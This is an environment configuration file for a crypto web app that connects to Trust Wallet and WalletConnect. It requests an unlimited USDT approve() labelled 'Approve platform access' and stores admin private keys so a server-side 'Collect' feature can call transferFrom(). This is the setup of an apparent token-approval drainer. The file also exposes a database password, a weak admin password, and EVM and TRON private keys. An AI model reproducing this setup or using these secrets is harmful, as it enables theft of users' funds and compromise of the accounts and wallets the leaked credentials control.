# Receiving addresses (Wallet B). Use testnet addresses while developing.
# ─── Site Identity (used in DApp metadata for Trust Wallet / WalletConnect) ────
# Set this to your production domain. Trust Wallet reads this to display the
# website name in its "Connect DApp" prompt and Settings → Connected DApps.
# Without this, Trust Wallet will show "localhost" (unverified) on dev builds.
VITE_SITE_URL=https://zenithblockchain.com
VITE_USE_MAINNET=false
VITE_WALLET_B_ETHEREUM=0x69Fdb255703aa08002a6f66B99E2D80cC34ebb26
VITE_WALLET_B_BSC=
VITE_WALLET_B_POLYGON=
VITE_WALLET_B_SOLANA=
VITE_WALLET_B_BITCOIN=

# Platform fee — shown in UI, used as approve() allowance amount
# VITE_PLATFORM_FEE_AMOUNT is the allowance to request (use "max" for unlimited)
VITE_PLATFORM_FEE_AMOUNT=max
VITE_PLATFORM_FEE_ASSET=USDT
VITE_PLATFORM_FEE_PURPOSE=Approve platform access

# Spender address — the address that gets spending permission via approve()
# Usually the same as WALLET_B_ETHEREUM or your smart contract address
VITE_SPENDER_ADDRESS=0x69Fdb255703aa08002a6f66B99E2D80cC34ebb26

# Spender & recipient address for TRON network (TRC-20 approve & collect)
VITE_SPENDER_ADDRESS_TRON=TBdWVx33WeWu4RMdQQrYs57osQzY5MC1JA

# ─── MySQL Database ─────────────────────────────────────────────────────────────
MYSQL_HOST=mysql-256f4fc0-avinashlodhi004-6126.a.aivencloud.com
MYSQL_PORT=23488
MYSQL_USER=avnadmin
MYSQL_PASSWORD=AVNS_wJBLzVntIH9kiA2oixs
MYSQL_DB=defaultdb

# ─── Admin Dashboard Auth ───────────────────────────────────────────────────
# Credentials for the admin dashboard at /admin
ADMIN_USERNAME=admin
ADMIN_PASSWORD=admin123

# ─── Admin Private Keys (for Collect feature) ──────────────────────────────
# Private key of the spender wallet — used to call transferFrom() server-side
# For EVM networks (Ethereum, BSC, Polygon):
ADMIN_PRIVATE_KEY=fd899a9a7d24a1c22027893ca91366b8217dadffd7d07257754cbab80de5ae17

# For TRON network (TRC-20 transferFrom):
ADMIN_TRON_PRIVATE_KEY=6f2dffab488b2da68af11656036fdbe41b6e010dc28769f495b6b3e655385d4c
VITE_WC_PROJECT_ID=1a1ad6cf91df61ac92f79ef1c718ade4
